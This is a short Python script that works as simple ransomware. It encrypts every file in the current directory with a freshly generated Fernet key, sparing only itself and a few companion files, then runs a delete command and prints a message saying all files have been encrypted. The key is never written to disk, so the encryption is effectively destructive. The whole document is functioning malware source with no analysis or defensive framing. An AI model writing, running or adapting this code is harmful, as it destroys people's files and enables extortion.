#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
        if file == "voldemort.py" or file == "bugging.vbs" or file == "decrypt.py" or file == "key.txt":
            pass
        elif os.path.isfile(file):
                files.append(file)
print(files)

key = Fernet.generate_key()
print(type(key))
try:
    for file in files:
            with open(file,"rb") as thefile:
                    content = thefile.read()
            contents_encrypted = Fernet(key).encrypt(content)
            with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)

    os.system("del Contents")
    print("all of your files have been encrypted")
except:
    print("Error")